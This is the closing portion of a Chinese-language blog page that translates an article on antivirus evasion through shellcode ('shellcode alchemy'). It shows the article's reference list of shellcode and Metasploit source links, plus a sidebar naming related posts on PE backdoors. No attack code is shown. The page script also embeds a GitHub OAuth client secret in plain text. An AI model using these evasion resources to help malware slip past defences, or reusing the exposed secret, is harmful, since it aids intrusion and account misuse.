+<li><a href="https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003" target="_blank" rel="external">https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Portable_Executable" target="_blank" rel="external">https://en.wikipedia.org/wiki/Portable_Executable</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a></li>
+<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="external">https://en.wikipedia.org/wiki/X86_calling_conventions</a></li>
+<li><a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">http://www.vividmachines.com/shellcode/shellcode.html</a></li>
+<li><a href="https://github.com/secretsquirrel/fido" target="_blank" rel="external">https://github.com/secretsquirrel/fido</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a></li>
+<li><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X" target="_blank" rel="external">The Shellcoder’s Handbook: Discovering and Exploiting Security Holes</a></li>
+<li><a href="https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059" target="_blank" rel="external">Sockets, Shellcode, Porting, and Coding: Reverse Engineering Exploits and Tool Coding for Security Professionals</a></li>
+</ul>
+<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/</a></em></p>
+</key></shellcode>
+      
+    </div>
+    <footer>
+      
+
+        
+        
+          <div class="alignright post-nav">
+            <em>下一篇: </em><a href="/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门（翻译）</a>
+          </div>
+          <div class="clearfix"></div>
+        
+
+        
+          <div class="copyright">
+            
+              <span class="claim">转载请注明youngroe.com</span>
+            
+            
+              <span class="from-link">
+                <em>本文链接地址:</em>
+                <a href="/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/">
+                  http://www.youngroe.com/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/
+                </a>
+              </span>
+            
+          </div>
+        
+        
+  
+  <div class="categories">
+    <a href="/categories/Cybersecurity/">Cybersecurity</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/反病毒/">反病毒</a>
+  </div>
+
+        
+          <! -- 添加捐赠图标 -->
+<div class ="post-donate">
+    <div id="donate_board" class="donate_bar center">
+        <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏"></a>
+        <span class="donate_txt">
+           ↑<br>
+           欣赏此文？求鼓励，求支持！
+        </span>
+        <br>
+      </div>  
+    <div id="donate_guide" class="donate_bar center hidden" >
+        <!-- 方式一： 
+            ![](/img/Alipay.jpg)
+            ![](/img/WeChatpay.jpg)
+        -->
+        <!-- 方式二；
+            step1：在_config.yml中添加配置
+                Alipay: /img/Alipay.jpg
+                WeChatpay: /img/WeChatpay.jpg
+            step2：此处两张图片的路径分别设置为如下
+                <img src="undefined"
+                <img src="undefined"
+        -->
+        <!-- 支付宝打赏图案 -->
+        <img src="/img/Alipay.png" alt="支付宝打赏">
+        <!-- 微信打赏图案 -->
+        <img src="/img/WeChatpay.png" alt="微信打赏">
+    </div>
+    <script type="text/javascript">
+        document.getElementById('btn_donate').onclick = function(){
+            $('#donate_board').addClass('hidden');
+            $('#donate_guide').removeClass('hidden');
+        }
+    </script>
+</div>
+<! -- 添加捐赠图标 -->
+        
+        <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+  clientID: '503c39aa3fb2b8c1b734',
+  clientSecret: '65d784ff7a95a9dbf4a4208c9e32166ca29654f2',
+  repo: 'geemion.github.io',
+  owner: 'geemion',
+  admin: 'geemion',
+  pagerDirection:'first',
+  id: md5(window.location.pathname)
+})
+
+gitalk.render('gitalk-container')
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+  <div id="container"></div>
+</span>
+</article>
+
+
+<section id="comment">
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/Cybersecurity/">Cybersecurity</a><small>4</small></li>
+  
+    <li><a href="/categories/Debug/">Debug</a><small>7</small></li>
+  
+    <li><a href="/categories/Kernel/">Kernel</a><small>4</small></li>
+  
+    <li><a href="/categories/Learning/">Learning</a><small>8</small></li>
+  
+    <li><a href="/categories/Life/">Life</a><small>6</small></li>
+  
+    <li><a href="/categories/Others/">Others</a><small>1</small></li>
+  
+    <li><a href="/categories/Tools/">Tools</a><small>6</small></li>
+  
+    <li><a href="/categories/Vulnerabilities/">Vulnerabilities</a><small>0</small></li>
+  
+    <li><a href="/categories/Windows/">Windows</a><small>13</small></li>
+  
+    <li><a href="/categories/life/">life</a><small>0</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/">反检测的艺术3-shellcode的魔力 （翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门（翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述（翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/08/02/Life/dns_hijacking/">记录一次被DNS劫持及解决方案(非改hosts方式)</a>
+      </li>
+    
+      <li>
+        <a href="/2019/07/01/Windows/delphi_reverse_summary/">Delphi程序逆向反汇编技巧小记</a>
+      </li>
+    
+      <li>
+        <a href="/2019/06/25/Kernel/kernel_enum_wfp_callout_function/">Windows内核重拾：如何枚举系统中Windows Filtering Platform (WFP)驱动中的callout函数</a>
+      </li>
+    
+      <li>
+        <a href="/2019/05/06/Kernel/windows-driver-testing-basics/">Windows内核重拾：Windows驱动测试基础：工具、功能和示例（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/">如何正确的对Windows软件进行逆向工程（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2019/01/12/Windows/a_crash_lead_deadlock/">Windows平台下一个崩溃而导致的死锁分析</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/06/Cybersecurity/ddos-protection-techniques/">现代DDoS对抗技术概述（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2018/09/18/Life/xian/">西安周末游</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/ASM/" style="font-size: 10px;">ASM</a> <a href="/tags/Boost/" style="font-size: 10px;">Boost</a> <a href="/tags/DDoS/" style="font-size: 10px;">DDoS</a> <a href="/tags/DNS-over-HTTPS/" style="font-size: 10px;">DNS-over-HTTPS</a> <a href="/tags/DNS劫持/" style="font-size: 10px;">DNS劫持</a> <a href="/tags/Delphi/" style="font-size: 10px;">Delphi</a> <a href="/tags/Dll劫持/" style="font-size: 10px;">Dll劫持</a> <a href="/tags/GCC-GDB/" style="font-size: 10px;">GCC&GDB</a> <a href="/tags/GetVersionEx/" style="font-size: 10px;">GetVersionEx</a> <a href="/tags/Http/" style="font-size: 10px;">Http</a> <a href="/tags/IDA-Pro/" style="font-size: 13.33px;">IDA Pro</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/MSDN/" style="font-size: 13.33px;">MSDN</a> <a href="/tags/Malware/" style="font-size: 13.33px;">Malware</a> <a href="/tags/MiniDumpWriteDump/" style="font-size: 10px;">MiniDumpWriteDump</a> <a href="/tags/PEB/" style="font-size: 10px;">PEB</a> <a href="/tags/Procmon/" style="font-size: 10px;">Procmon</a> <a href="/tags/Runtime-Error/" style="font-size: 10px;">Runtime Error</a> <a href="/tags/SEH/" style="font-size: 10px;">SEH</a> <a href="/tags/SysinternalsSuite/" style="font-size: 10px;">SysinternalsSuite</a> <a href="/tags/Tips/" style="font-size: 10px;">Tips</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/UAF漏洞/" style="font-size: 10px;">UAF漏洞</a> <a href="/tags/VC/" style="font-size: 10px;">VC</a> <a href="/tags/Visual-Studio/" style="font-size: 13.33px;">Visual Studio</a> <a href="/tags/Windbg/" style="font-size: 10px;">Windbg</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/getaddrinfo/" style="font-size: 10px;">getaddrinfo</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/libeay32/" style="font-size: 10px;">libeay32</a> <a href="/tags/markdown/" style="font-size: 10px;">markdown</a> <a href="/tags/ndk/" style="font-size: 10px;">ndk</a> <a href="/tags/sublime-text3/" style="font-size: 10px;">sublime text3</a> <a href="/tags/x64/" style="font-size: 10px;">x64</a> <a href="/tags/体验/" style="font-size: 10px;">体验</a> <a href="/tags/内核/" style="font-size: 13.33px;">内核</a> <a href="/tags/内核结构/" style="font-size: 16.67px;">内核结构</a> <a href="/tags/反病毒/" style="font-size: 16.67px;">反病毒</a> <a href="/tags/安全机制/" style="font-size: 10px;">安全机制</a> <a href="/tags/异常处理/" style="font-size: 10px;">异常处理</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/服务/" style="font-size: 10px;">服务</a> <a href="/tags/权限/" style="font-size: 13.33px;">权限</a> <a href="/tags/栈溢出漏洞/" style="font-size: 10px;">栈溢出漏洞</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/漏洞调试/" style="font-size: 13.33px;">漏洞调试</a> <a href="/tags/生活/" style="font-size: 16.67px;">生活</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/西安/" style="font-size: 10px;">西安</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/读书/" style="font-size: 10px;">读书</a> <a href="/tags/调试/" style="font-size: 16.67px;">调试</a> <a href="/tags/转换/" style="font-size: 10px;">转换</a> <a href="/tags/进程/" style="font-size: 10px;">进程</a> <a href="/tags/逆向/" style="font-size: 10px;">逆向</a> <a href="/tags/重庆/" style="font-size: 10px;">重庆</a> <a href="/tags/驱动/" style="font-size: 16.67px;">驱动</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">Links</h3>
+<ul class="entry">
+<li><a href="http://blog.ourren.com/" title="Ourren">Ourren</a></li>
+<li><a href="http://www.hyjal.net/" title="Hyjal">Hyjal</a></li>
+<li><a href="http://www.jianshu.com/users/fa15f4e416ae/latest_articles" title="Daemonceltics">Daemonceltics</a></li>
+<li><a href="http://papap.info/" title="isee">isee</a></li>
+</ul>
+</div>
+
+  <script type="text/javascript" id="clustrmaps" src="//cdn.clustrmaps.com/map_v2.js?u=putG&d=yoFnN6V-ovhL-H4e9_69LvkTiX4uX7rEYJ15yL3G1Wg"></script>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <div id="go-pg-top"><i class="icon-arrow-up"></i></div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2021 Lyon
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/page.js"></script>
+
+</body>
+
+</html>
